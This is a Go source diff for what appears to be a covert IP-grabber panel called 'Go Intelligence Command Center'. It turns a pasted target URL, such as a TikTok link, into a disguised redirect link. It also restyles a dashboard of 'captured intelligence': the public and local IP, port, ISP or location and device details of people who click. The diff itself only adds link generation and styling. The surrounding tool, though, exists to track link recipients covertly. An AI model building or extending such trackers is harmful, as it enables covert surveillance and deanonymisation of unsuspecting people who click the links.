@@ -26,9 +26,13 @@ type Capture struct {
 	CreatedAt  string
 }
 
+type PageData struct {
+	GeneratedLink string
+	Captures      []Capture
+}
+
 func initDB() {
 	var err error
-	// استخدام محرك sqlite النقي الخاص بـ modernc
 	db, err = sql.Open("sqlite", "./long_term_tracker.db")
 	if err != nil {
 		panic(err)
@@ -245,6 +249,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	var generatedLink string
 	if r.Method == http.MethodPost {
 		r.ParseForm()
 		targetURL := r.FormValue("target_url")
@@ -254,9 +259,13 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			}
 			codeGen := fmt.Sprintf("%d", time.Now().UnixNano())[8:]
 			db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
+
+			scheme := "https"
+			if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
+				scheme = "http"
+			}
+			generatedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
 		}
-		http.Redirect(w, r, "/", http.StatusSeeOther)
-		return
 	}
 
 	rows, _ := db.Query("SELECT id, code, public_ip, local_ip, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
@@ -269,60 +278,241 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		captures = append(captures, c)
 	}
 
+	data := PageData{
+		GeneratedLink: generatedLink,
+		Captures:      captures,
+	}
+
 	tmpl := `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Go High-Performance Tracker Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Go Intelligence Command Center</title>
     <style>
-        body { background: #0b0f17; color: #e2e8f0; font-family: sans-serif; padding: 20px; }
-        .box { background: #131b2e; border: 1px solid #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 20px; max-width: 900px; margin-left: auto; margin-right: auto; }
-        input[type="text"] { width: 70%%; padding: 10px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 5px; }
-        button { background: #6366f1; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        table { width: 100%%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
-        th, td { border: 1px solid #1e293b; padding: 8px; text-align: center; }
-        th { background: #020617; color: #94a3b8; }
+        :root {
+            --bg-grad-1: #0f172a;
+            --bg-grad-2: #1e1b4b;
+            --card-bg: rgba(19, 27, 46, 0.75);
+            --border-glow: rgba(99, 102, 241, 0.3);
+            --accent: #6366f1;
+            --accent-hover: #4f46e5;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --success: #10b981;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
+        body {
+            background: linear-gradient(135deg, var(--bg-grad-1), var(--bg-grad-2));
+            color: var(--text-main);
+            min-height: 100vh;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container {
+            width: 100%%;
+            max-width: 1100px;
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            background: linear-gradient(90deg, #818cf8, #c084fc, #38bdf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 0.5px;
+        }
+        header p {
+            color: var(--text-muted);
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-glow);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            transition: transform 0.3s ease;
+        }
+        .card:hover {
+            border-color: rgba(99, 102, 241, 0.6);
+        }
+        h2 {
+            font-size: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: #a5b4fc;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .form-group {
+            display: flex;
+            gap: 12px;
+        }
+        input[type="text"] {
+            flex: 1;
+            background: rgba(2, 6, 23, 0.8);
+            border: 1px solid #334155;
+            border-radius: 10px;
+            padding: 14px 18px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        input[type="text"]:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 15px rgba(99, 102, 241, 0.3);
+        }
+        button {
+            background: linear-gradient(135deg, var(--accent), #4f46e5);
+            color: #fff;
+            border: none;
+            padding: 0 28px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6);
+        }
+        .result-box {
+            background: rgba(2, 6, 23, 0.9);
+            border: 1px solid var(--success);
+            padding: 16px;
+            border-radius: 10px;
+            margin-top: 18px;
+            animation: fadeIn 0.4s ease-in-out;
+        }
+        .result-box strong {
+            color: var(--success);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .result-box a {
+            color: #38bdf8;
+            text-decoration: none;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+        }
+        .result-box a:hover {
+            text-decoration: underline;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            margin-top: 10px;
+        }
+        table {
+            width: 100%%;
+            border-collapse: collapse;
+            text-align: left;
+            font-size: 13px;
+        }
+        th, td {
+            padding: 12px 14px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        th {
+            background: rgba(15, 23, 42, 0.7);
+            color: var(--text-muted);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 0.05em;
+        }
+        tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+        .badge-code { color: #818cf8; font-family: monospace; font-weight: bold; }
+        .badge-ip { color: #38bdf8; font-family: monospace; }
+        .badge-local { color: #fbbf24; font-family: monospace; }
+        .badge-isp { color: #34d399; font-weight: 600; }
+        .badge-dev { color: #fb7185; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Generate Tracking Link</h2>
-        <form method="POST">
-            <input type="text" name="target_url" placeholder="https://www.tiktok.com/..." required>
-            <button type="submit">Create Link</button>
-        </form>
-    </div>
+    <div class="container">
+        <header>
+            <h1>⚡ GO INTELLIGENCE COMMAND CENTER</h1>
+            <p>High-Performance Real-Time Tracking & Data Persistence Engine</p>
+        </header>
 
-    <div class="box" style="max-width: 1100px;">
-        <h2>Captured Intelligence Logs (Long-Term Storage)</h2>
-        <table>
-            <tr>
-                <th>ID</th>
-                <th>Code</th>
-                <th>Public IP</th>
-                <th>Local IP</th>
-                <th>Network / ISP</th>
-                <th>Hardware & Specs</th>
-                <th>Time</th>
-            </tr>
-            {{range .}}
-            <tr>
-                <td>{{.ID}}</td>
-                <td style="color:#6366f1; font-weight:bold;">{{.Code}}</td>
-                <td style="color:#38bdf8;">{{.PublicIP}}</td>
-                <td style="color:#f59e0b;">{{.LocalIP}}</td>
-                <td style="color:#10b981;">{{.Location}}</td>
-                <td style="color:#f43f5e;">{{.DeviceInfo}}</td>
-                <td>{{.CreatedAt}}</td>
-            </tr>
+        <div class="card">
+            <h2>🔗 Generate Tracking Link</h2>
+            <form method="POST" class="form-group">
+                <input type="text" name="target_url" placeholder="Paste target URL (e.g., https://www.tiktok.com/...)" required autocomplete="off">
+                <button type="submit">Create Link</button>
+            </form>
+            {{if .GeneratedLink}}
+            <div class="result-box">
+                <strong>✨ Active Generated Link:</strong>
+                <a href="{{.GeneratedLink}}" target="_blank">{{.GeneratedLink}}</a>
+            </div>
             {{end}}
-        </table>
+        </div>
+
+        <div class="card">
+            <h2>📊 Captured Intelligence Logs (Long-Term Storage)</h2>
+            <div class="table-responsive">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Code</th>
+                            <th>Public IP</th>
+                            <th>Local IP</th>
+                            <th>Network / ISP</th>
+                            <th>Hardware & Specs</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {{range .Captures}}
+                        <tr>
+                            <td>{{.ID}}</td>
+                            <td><span class="badge-code">{{.Code}}</span></td>
+                            <td><span class="badge-ip">{{.PublicIP}}</span></td>
+                            <td><span class="badge-local">{{.LocalIP}}</span></td>
+                            <td><span class="badge-isp">{{.Location}}</span></td>
+                            <td><span class="badge-dev">{{.DeviceInfo}}</span></td>
+                            <td style="color: var(--text-muted);">{{.CreatedAt}}</td>
+                        </tr>
+                        {{end}}
+                    </tbody>
+                </table>
+            </div>
+        </div>
     </div>
 </body>
 </html>`
 
 	t, _ := template.New("index").Parse(tmpl)
-	t.Execute(w, captures)
+	t.Execute(w, data)
 }
 
 func main() {
